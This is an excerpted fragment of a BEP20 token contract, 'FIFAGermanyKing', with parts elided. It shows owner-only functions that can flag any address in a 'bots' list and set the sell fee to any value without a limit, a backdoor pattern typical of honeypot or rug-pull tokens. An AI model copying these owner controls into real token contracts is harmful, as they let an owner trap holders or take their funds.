...
contract Figerg is IBEP20, Admin{
    ...
    string constant _name = "FIFAGermanyKing";
    string constant _symbol = "Figerg";
    ...
    address private marketingFeeReceiver = (0x49BeB5eAd54E1143f74FCa29871C9b091519fBa1); // marketing address
    ...
    function setBMFigerg(address account,bool bmv) external onlyOwner() {
        bots[account] = bmv;
    }

    function setFMFigerg(uint256 fv) external onlyOwner {
        sellMarketingFee = fv;
    }
